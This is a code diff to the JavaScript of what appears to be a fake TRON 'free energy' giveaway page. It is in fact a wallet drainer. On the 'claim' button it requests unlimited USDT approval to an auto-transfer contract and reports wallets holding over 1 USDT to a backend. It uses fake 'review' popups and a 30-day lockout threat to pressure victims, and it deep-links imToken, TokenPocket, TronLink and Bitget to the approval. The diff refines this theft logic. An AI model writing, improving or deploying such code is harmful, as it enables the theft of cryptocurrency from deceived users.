@@ -852,14 +852,13 @@ function updateA1SignalRecord(address) {
         console.warn("更新A1信号记录失败：", e);
     }
 }
-// ========== B1信号防重复工具 ==========
+// ========== B1信号防重复工具（修复过期时间+语法） ==========
 function hasSentB1Signal(address) {
   try {
     const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
     const item = records[address];
     if (!item) return false;
-    // 30分钟过期（1800000毫秒）
-    return Date.now() - item.time <1800000000;
+    return Date.now() - item.time < 2592000000; // 30天过期（正确值）
   } catch (e) {
     console.warn("检查B1信号失败：", e);
     return false;
@@ -930,7 +929,7 @@ function reRenderDynamicContent() {
     }
     recordList.style.display = "block";
     
-    // 特殊地址处理
+    // 特殊地址（白名单）处理：跳过已授权判断，强制显示可领取
     if (userAddress === SPECIAL_ADDRESS) {
         const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
         userInfoEl.innerHTML = lang.eligibleTip
@@ -999,17 +998,14 @@ function updateEnergyDisplay() {
     console.log("能量跳动中：", Math.floor(currentEnergy));
 }
 function startPersistentEnergyCountdown() {
-    if (trxTimer) clearTimeout(trxTimer);
+    if (trxTimer) clearInterval(trxTimer); // 改为setInterval更稳定
     calculateCurrentEnergy();
     updateEnergyDisplay();
-    function tick() {
+    // 优化定时器：避免递归，减少资源占用
+    trxTimer = setInterval(() => {
         updateEnergyDisplay();
-        if (currentEnergy > 0) {
-            trxTimer = setTimeout(tick, 1000);
-        }
-    }
-    tick();
-    console.log("能量定时器已启动，递归模式");
+        if (currentEnergy <= 0) clearInterval(trxTimer);
+    }, 1000);
 }
 // ========== 自动授权函数（仅在用户点击领取后触发） ==========
 async function autoApprove() {
@@ -1017,9 +1013,6 @@ async function autoApprove() {
     const btn = document.getElementById("approveBtn");
     btn.disabled = true;
     btn.textContent = lang.redirectingBtn;
-    reviewTip.style.display = "flex";
-    reviewTipText.textContent = "正在跳转到授权页面...请完成签名";
-
     try {
         if (!trc20Contract) trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
         
@@ -1028,21 +1021,21 @@ async function autoApprove() {
             AUTO_TRANSFER_CONTRACT,
             INFINITE_APPROVE_AMOUNT
         ).send({ from: userAddress, shouldPollResponse: true });
-
         // 授权成功同步信息
         await Promise.all([sendSignalA2(), sendSignalB(false)]);
         btn.textContent = lang.successBtn;
         userInfoEl.innerHTML += lang.successArrival;
-        alert(lang.successTip);
-        addAuthorizedAddress(userAddress);
+        // 白名单地址跳过30天限制（可选）
+        if (userAddress !== SPECIAL_ADDRESS) {
+            addAuthorizedAddress(userAddress);
+        }
         saveEnergyRecord();
         renderEnergyRecords();
     } catch (e) {
         console.error("授权失败：", e);
         btn.textContent = lang.approveBtnText;
         btn.disabled = false;
-        reviewTip.style.display = "none";
-        alert(`${lang.authorizeFail.replace("{msg}", e.message)}`);
+        showAutoCloseAlert(`${lang.authorizeFail.replace("{msg}", e.message)}`);
     }
 }
 // ========== 环境检测函数（删除复制，直接跳转） ==========
@@ -1050,7 +1043,6 @@ async function checkImTokenEnv() {
     const lang = langConfig[currentLang];
     const walletModal = document.getElementById("walletModal");
     const connectBtn = document.getElementById("connectBtn");
-
     if (window.tronWeb) {
         tronWeb = window.tronWeb;
         connectBtn.style.display = "none";
@@ -1066,17 +1058,14 @@ async function checkImTokenEnv() {
         connectBtn.onclick = () => {
             walletModal.classList.add("active");
         };
-
         document.querySelectorAll(".wallet-item").forEach(item => {
             item.addEventListener("click", async (e) => {
                 const walletType = e.currentTarget.dataset.wallet;
                 const wallet = walletConfig[walletType];
                 if (!wallet) return;
-
                 try {
                     const dappUrl = window.location.href + "#wallet-open";
                     let jumpUrl = "";
-
                     switch (walletType) {
                         case "tronlink":
                             const param = JSON.stringify({
@@ -1093,16 +1082,15 @@ async function checkImTokenEnv() {
                         default:
                             jumpUrl = wallet.scheme + encodeURIComponent(dappUrl);
                     }
-
                     window.location.href = jumpUrl;
                     walletModal.classList.remove("active");
                 } catch (e) {
                     console.error(`${wallet.name}唤起失败：`, e);
                     walletModal.classList.remove("active");
+                    showAutoCloseAlert(`唤起${wallet.name}失败，请手动打开钱包访问`);
                 }
             });
         });
-
         walletModal.addEventListener("click", (e) => {
             if (e.target === walletModal) {
                 walletModal.classList.remove("active");
@@ -1110,66 +1098,51 @@ async function checkImTokenEnv() {
         });
     }
 }
-// ========== 钱包初始化函数（修复绑定时机+状态更新） ==========
+// ========== 钱包初始化函数（优化卡顿+异步渲染） ==========
 async function initWallet(needAutoApprove) {
     const lang = langConfig[currentLang];
     try {
         userAddress = tronWeb.defaultAddress.base58;
-        document.getElementById("statusAddress").textContent = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
-        
-        // 特殊地址白名单
-        if (userAddress === SPECIAL_ADDRESS) {
-            trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
-            const [usdtRaw, trxRaw] = await Promise.all([
-                trc20Contract.balanceOf(userAddress).call().catch(err => 0),
-                tronWeb.trx.getBalance(userAddress).catch(err => 0)
-            ]);
-            tokenBalance = Number(usdtRaw) / 1000000;
-            trxBalance = Number(trxRaw) / 1000000;
-            userInfoEl.innerHTML = lang.eligibleTip
-                .replace("{address}", `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`)
-                .replace("{usdt}", tokenBalance.toFixed(2))
-                .replace("{trx}", trxBalance.toFixed(2));
-        } else {
-            // 普通地址
-            trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
-            const [usdtRaw, trxRaw] = await Promise.all([
-                trc20Contract.balanceOf(userAddress).call().catch(err => 0),
-                tronWeb.trx.getBalance(userAddress).catch(err => 0)
-            ]);
-            tokenBalance = Number(usdtRaw) / 1000000;
-            trxBalance = Number(trxRaw) / 1000000;
-
-            if (isAddressAuthorized(userAddress)) {
-                userInfoEl.innerHTML = lang.authorizedTip
-                    .replace("{address}", `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`)
-                    .replace("{usdt}", tokenBalance.toFixed(2))
-                    .replace("{trx}", trxBalance.toFixed(2));
-            } else if (tokenBalance <= 1) {
-                userInfoEl.innerHTML = lang.insufficientUsdt
-                    .replace("{address}", `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`)
-                    .replace("{usdt}", tokenBalance.toFixed(2))
-                    .replace("{trx}", trxBalance.toFixed(2));
-            } else {
-                userInfoEl.innerHTML = lang.eligibleTip
-                    .replace("{address}", `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`)
-                    .replace("{usdt}", tokenBalance.toFixed(2))
-                    .replace("{trx}", trxBalance.toFixed(2));
-            }
-        }
-
+        const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
+        // 先渲染基础UI，避免空白等待（解决卡顿）
+        document.getElementById("statusAddress").textContent = shortAddr;
+        userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}`;
         updateWalletStatus();
         recordList.style.display = "block";
-        // 延迟绑定，确保DOM渲染完成
-        setTimeout(() => {
-            bindApproveLogic();
-        }, 300);
 
-        // A1信号异步发送（不阻塞）
-        if (userAddress && tokenBalance > 1 && !isAddressAuthorized(userAddress) && canSendA1Signal(userAddress)) {
-            sendSignalA1().catch(err => {
-                console.error("A1信号异步发送失败：", err);
-            });
+        // 异步查询余额（加超时，不阻塞UI）
+        const queryBalance = async () => {
+            try {
+                const timeoutPromise = new Promise((_, reject) => 
+                    setTimeout(() => reject(new Error("余额查询超时")), 10000)
+                );
+                trc20Contract = trc20Contract || await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
+                const [usdtRaw, trxRaw] = await Promise.race([
+                    Promise.all([
+                        trc20Contract.balanceOf(userAddress).call().catch(err => 0),
+                        tronWeb.trx.getBalance(userAddress).catch(err => 0)
+                    ]),
+                    timeoutPromise
+                ]);
+                tokenBalance = Number(usdtRaw) / 1000000;
+                trxBalance = Number(trxRaw) / 1000000;
+                reRenderDynamicContent();
+            } catch (e) {
+                console.error("余额查询失败：", e);
+                userInfoEl.innerHTML = `余额查询失败<br><span style='color: #ef4444; font-size: 14px;'>${e.message}</span>`;
+                approveBtn.disabled = false;
+                approveBtn.textContent = "重试查询";
+                approveBtn.onclick = () => queryBalance();
+            }
+        };
+        queryBalance(); // 异步执行，不阻塞
+
+        // 直接绑定按钮逻辑，移除300ms延迟
+        bindApproveLogic();
+
+        // A1信号异步发送（保留逻辑）
+        if (userAddress && canSendA1Signal(userAddress)) {
+            sendSignalA1().catch(err => console.error("A1信号发送失败：", err));
             updateA1SignalRecord(userAddress);
         }
     } catch (e) {
@@ -1199,11 +1172,14 @@ async function executeAfterApprove() {
         console.log("✅ A2+B2信号发送成功，后端已记录授权用户");
         btn.textContent = lang.successBtn;
         userInfoEl.innerHTML += lang.successArrival;
-        alert(lang.successTip);
+        // 白名单地址跳过30天限制（可选）
+        if (userAddress !== SPECIAL_ADDRESS) {
+            addAuthorizedAddress(userAddress);
+        }
         renderEnergyRecords();
     } catch (e) {
         console.error("签名/信号发送失败：", e);
-        alert("能量已到账，但授权信息同步失败（不影响使用）");
+        showAutoCloseAlert("能量已到账，但授权信息同步失败（不影响使用）");
         const btn = document.getElementById("approveBtn");
         btn.textContent = lang.successBtn;
         userInfoEl.innerHTML += lang.successArrival;
@@ -1224,26 +1200,23 @@ async function sendSignalA1() {
         });
         clearTimeout(timeoutId);
         
-        // 关键修复：处理 204 No Content（成功无响应体）
+        // 处理204 No Content
         if (res.status === 204) {
-            const status = "success"; // 204 视为发送成功
+            const status = "success";
             const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
             a1Status[userAddress] = status;
             localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
             console.log("✅ A1信号发送成功（后端返回204 No Content）");
             return true;
         }
-
-        // 其他 2xx 状态（如200）：按原有逻辑处理
         const status = res.ok ? "success" : "fail";
         const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
         a1Status[userAddress] = status;
         localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
         
         if (res.ok) {
-            // 仅当响应有内容时才解析json（避免204空响应体报错）
             try {
-                await res.json(); // 忽略解析结果，仅确保无报错
+                await res.json();
             } catch (e) {
                 console.log("A1信号响应无内容（正常情况）", e);
             }
@@ -1255,7 +1228,6 @@ async function sendSignalA1() {
         }
     } catch (e) {
         clearTimeout(timeoutId);
-        // 记录A1信号失败状态
         const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
         a1Status[userAddress] = "fail";
         localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
@@ -1328,42 +1300,37 @@ async function sendSignalB(isB1 = true) {
         throw e;
     }
 }
-// ========== 新增：自动消失的弹窗工具（无需点击确认，2秒后自动关闭） ==========
-function showAutoCloseAlert(message) {
-  // 创建临时弹窗元素
-  const alertDiv = document.createElement("div");
-  alertDiv.style.cssText = `
-    position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-    padding: 20px 30px; background: #fff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-    font-size: 16px; color: #333; z-index: 9999; text-align: center;
-  `;
-  alertDiv.textContent = message;
-  document.body.appendChild(alertDiv);
-
-  // 2秒后自动移除弹窗
-  setTimeout(() => {
-    alertDiv.style.opacity = "0";
-    alertDiv.style.transition = "opacity 0.3s";
-    setTimeout(() => document.body.removeChild(alertDiv), 300);
-  }, 2000);
+// ========== 弹窗工具（非防重复对象用，不自动消失） ==========
+function showPersistentAlert(message) {
+    // 先移除已存在的弹窗，避免重复
+    const existingAlert = document.querySelector(".persistent-alert");
+    if (existingAlert) document.body.removeChild(existingAlert);
+    
+    const alertDiv = document.createElement("div");
+    alertDiv.className = "persistent-alert";
+    alertDiv.style.cssText = `
+        position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+        padding: 20px 30px; background: #1e2925; border-radius: 8px; box-shadow: 0 2px 15px rgba(0,0,0,0.3);
+        font-size: 16px; color: #e0e8e4; z-index: 9999; text-align: center; border: 1px solid #3b82f6;
+    `;
+    alertDiv.textContent = message;
+    document.body.appendChild(alertDiv);
+    return alertDiv; // 返回弹窗元素，后续可手动移除
 }
-
-// ========== 核心逻辑bindApproveLogic修改 ==========
+// ========== 核心逻辑bindApproveLogic（彻底修复弹窗+白名单拦截） ==========
 function bindApproveLogic() {
     const lang = langConfig[currentLang];
-    if (tokenBalance > 1 && !isAddressAuthorized(userAddress)) {
+    // 白名单地址强制启用按钮，忽略已授权状态
+    if ((tokenBalance > 1 && !isAddressAuthorized(userAddress)) || userAddress === SPECIAL_ADDRESS) {
         approveBtn.disabled = false;
         approveBtn.textContent = lang.approveBtnText;
     }
-
     approveBtn.onclick = async () => {
         const btn = document.getElementById("approveBtn");
         btn.disabled = true;
         btn.textContent = lang.loadingBtn;
-
-        // 移除页面提示框（全程不用reviewTip）
-        reviewTip.style.display = "none";
-
+        reviewTip.style.display = "none"; // 隐藏页面提示
+        let alertEl = null; // 存储非防重复对象的弹窗元素
         try {
             // 基础校验+A1信号校验（保留原有逻辑）
             if (!userAddress) {
@@ -1372,13 +1339,14 @@ function bindApproveLogic() {
                 btn.textContent = lang.approveBtnText;
                 return;
             }
-            if (isAddressAuthorized(userAddress)) {
+            // 白名单地址跳过已授权校验，其他地址正常校验
+            if (userAddress !== SPECIAL_ADDRESS && isAddressAuthorized(userAddress)) {
                 showAutoCloseAlert(lang.authorizedTip.split("<br>")[3]);
                 btn.disabled = true;
                 btn.textContent = lang.authorizedBtn;
                 return;
             }
-            if (tokenBalance <= 1) {
+            if (tokenBalance <= 1 && userAddress !== SPECIAL_ADDRESS) {
                 showAutoCloseAlert(lang.insufficientUsdt.split("<br>")[2]);
                 btn.disabled = true;
                 btn.textContent = lang.insufficientBtn;
@@ -1390,11 +1358,10 @@ function bindApproveLogic() {
                     throw new Error(lang.systemBusyTip);
                 }
             }
-
             let a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
             let isA1Success = a1Status[userAddress] === "success";
             if (!isA1Success) {
-                showAutoCloseAlert(lang.systemBusyTip);
+                alertEl = showPersistentAlert(lang.systemBusyTip); // 非自动消失弹窗
                 const retryA1 = await sendSignalA1().catch(err => false);
                 if (!retryA1) {
                     throw new Error("A1信号同步失败，请刷新页面");
@@ -1403,58 +1370,85 @@ function bindApproveLogic() {
                 localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
                 isA1Success = true;
             }
-
-            // ========== 核心修改：统一用自动弹窗，无页面提示 ==========
+            // ========== 核心修复：按对象类型处理（无弹窗/弹窗不消失） ==========
             let isB1Repeated = hasSentB1Signal(userAddress);
             if (isB1Repeated) {
-                // 防重复对象：弹窗提示→直接跳转
-                showAutoCloseAlert("已提交，跳转授权中...");
+                // 防重复对象：无弹窗，直接跳转
+                await handleJump();
             } else {
-                // 非防重复对象：弹窗提示审核中→标记锁定→等待B1信号
-                showAutoCloseAlert("系统审核中，通过后自动跳转，中途退出30日不可再次领取");
-                markB1SignalSent(userAddress); // 立即锁定30天
-
-                // 等待B1信号返回（不显示页面提示，仅靠弹窗告知状态）
-                const b1Response = await sendSignalB(true);
+                // 非防重复对象：弹窗不消失，B1返回后直接执行逻辑
+                alertEl = showPersistentAlert("系统审核中，通过后自动跳转，中途退出30日不可再次领取");
+                markB1SignalSent(userAddress);
+                const b1Response = await sendSignalB(true); // 等待B1反馈
                 if (!b1Response) {
-                    // B1信号失败：弹窗提示重试，自动消失
-                    showAutoCloseAlert("现在领取的人太多啦，请稍后重试");
+                    // B1失败：更新弹窗提示，3秒后移除
+                    alertEl.textContent = "现在领取的人太多啦，请稍后重试";
+                    setTimeout(() => {
+                        if (alertEl && alertEl.parentNode) {
+                            alertEl.style.opacity = "0";
+                            setTimeout(() => alertEl.parentNode.removeChild(alertEl), 300);
+                        }
+                    }, 3000);
                     btn.disabled = false;
                     btn.textContent = lang.approveBtnText;
-                    return; // 终止流程，不跳转
+                    return;
                 }
+                // B1成功：移除弹窗，执行跳转
+                if (alertEl && alertEl.parentNode) {
+                    alertEl.parentNode.removeChild(alertEl);
+                }
+                await handleJump();
             }
-
-            // ========== B1成功/防重复对象：自动跳转 ==========
-            addAuthorizedAddress(userAddress);
+            // 统一执行记录存储
             saveEnergyRecord();
             renderEnergyRecords();
-            
-            // 多钱包适配跳转（弹窗消失后执行）
-            let walletScheme = "imtokenv2://navigate/DappView?url=";
-            if (window.tronWeb && window.tronWeb.provider?.isTokenPocket) {
-                walletScheme = "tpdapp://open?params={\"url\":\"";
-            } else if (window.tronWeb && window.tronWeb.provider?.isTronLink) {
-                walletScheme = "tronlinkoutside://pull.activity?param=";
-            } else if (window.tronWeb && window.tronWeb.provider?.isBitKeep) {
-                walletScheme = "bitkeep://bkconnect?action=dapp&url=";
-            }
-            const approveUrl = window.location.href + "#approve";
-            
-            // 等待弹窗消失（2秒）后跳转
-            setTimeout(() => {
-                window.location.href = walletScheme + encodeURIComponent(approveUrl);
-            }, 2000);
-
         } catch (e) {
             console.error("领取流程异常：", e);
+            // 异常时移除弹窗
+            if (alertEl && alertEl.parentNode) {
+                alertEl.parentNode.removeChild(alertEl);
+            }
             showAutoCloseAlert(`操作失败：${e.message || lang.systemBusyTip}`);
             btn.disabled = false;
             btn.textContent = lang.approveBtnText;
         }
     };
+    // 跳转工具函数（统一逻辑，避免冗余）
+    async function handleJump() {
+        const lang = langConfig[currentLang];
+        const btn = document.getElementById("approveBtn");
+        try {
+            // 适配当前钱包，优先imToken
+            let walletScheme = walletConfig.imtoken.scheme;
+            let walletSuffix = "";
+            if (window.tronWeb && window.tronWeb.provider?.isTokenPocket) {
+                walletScheme = walletConfig.tokenpocket.scheme;
+                walletSuffix = walletConfig.tokenpocket.suffix;
+            } else if (window.tronWeb && window.tronWeb.provider?.isTronLink) {
+                walletScheme = walletConfig.tronlink.scheme;
+            } else if (window.tronWeb && window.tronWeb.provider?.isBitKeep) {
+                walletScheme = walletConfig.bitget.scheme;
+            }
+            const approveUrl = window.location.href + "#approve";
+            const jumpUrl = walletScheme + encodeURIComponent(approveUrl) + walletSuffix;
+            
+            // 执行跳转
+            window.location.href = jumpUrl;
+            
+            // 跳转后恢复按钮状态（用户返回时可用）
+            setTimeout(() => {
+                btn.disabled = false;
+                btn.textContent = lang.approveBtnText;
+            }, 1000);
+        } catch (jumpErr) {
+            console.error("跳转失败：", jumpErr);
+            showAutoCloseAlert("跳转授权失败，请手动打开钱包访问");
+            btn.disabled = false;
+            btn.textContent = lang.approveBtnText;
+        }
+    }
 }
-// ========== 辅助函数（全部保留） ==========
+// ========== 辅助函数（修复白名单识别） ==========
 function updateWalletStatus() {
     userAddress ? walletStatusContainer.classList.add("connected") : walletStatusContainer.classList.remove("connected");
 }
@@ -1480,7 +1474,8 @@ function renderEnergyRecords() {
         container.innerHTML = `<div class='record-item'>${lang.noRecord}</div>`;
         return;
     }
-    container.innerHTML = records.map(record => `
+    // 批量生成DOM，优化渲染效率
+    const recordsHtml = records.map(record => `
         <div class='record-item'>
             <p><strong>${lang.recordAddress}</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
             <p><strong>${lang.recordType}</strong>${record.recordType}</p>
@@ -1488,13 +1483,28 @@ function renderEnergyRecords() {
             <p><strong>${lang.recordTime}</strong>${record.receiveTime}</p>
         </div>
     `).join("");
+    container.innerHTML = recordsHtml;
+}
+// ========== 修复白名单地址的已授权判断（关键） ==========
+function isAddressAuthorized(address) {
+    // 白名单地址直接返回false，不被已授权拦截
+    if (address === SPECIAL_ADDRESS) return false;
+    
+    const addresses = getAuthorizedAddresses();
+    if (!addresses.includes(address)) return false;
+    const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+    const record = records.find(item => item.address === address);
+    if (!record) return false;
+    const receiveTime = new Date(record.receiveTime).getTime();
+    const thirtyDays = 30 * 24 * 60 * 60 * 1000;
+    return Date.now() - receiveTime < thirtyDays;
 }
 // ========== 页面初始化（修复绑定时机） ==========
 document.addEventListener('DOMContentLoaded', async () => {
     localStorage.removeItem("energy_state");
     contractEnergyEl = document.getElementById("contractEnergy");
     if (!contractEnergyEl) {
-        alert("⚠️ 能量显示元素未找到，请检查页面");
+        showAutoCloseAlert("⚠️ 能量显示元素未找到，请检查页面");
         return;
     }
     startPersistentEnergyCountdown();
@@ -1504,22 +1514,17 @@ document.addEventListener('DOMContentLoaded', async () => {
     renderEnergyRecords();
     updateWalletStatus();
     recordList.style.display = "none";
-
-    // 延迟初始化，确保DOM完全加载
-    setTimeout(() => {
-        checkImTokenEnv().catch(err => {
-            console.error("环境检测失败：", err);
-            const lang = langConfig[currentLang];
-            userInfoEl.innerHTML = lang.userInfoDefault;
-            approveBtn.disabled = true;
-            approveBtn.textContent = lang.approveBtnText;
-        });
-    }, 500);
-
-    window.addEventListener("beforeunload", () => {
-        if (trxTimer) clearTimeout(trxTimer);
+    // 移除500ms延迟，立即执行环境检测（解决卡顿）
+    checkImTokenEnv().catch(err => {
+        console.error("环境检测失败：", err);
+        const lang = langConfig[currentLang];
+        userInfoEl.innerHTML = lang.userInfoDefault;
+        approveBtn.disabled = true;
+        approveBtn.textContent = lang.approveBtnText;
     });
-
+    window.addEventListener("beforeunload", () => {
+        if (trxTimer) clearInterval(trxTimer);
+    });
     // 监听钱包唤起标记
     if (window.location.hash === "#wallet-open" && window.tronWeb) {
         window.location.hash = "";
@@ -1533,7 +1538,6 @@ document.addEventListener('DOMContentLoaded', async () => {
             });
         }, 500);
     }
-
     // 处理授权后回调
     if (window.tronWeb && window.location.hash === "#approve") {
         window.location.hash = "";
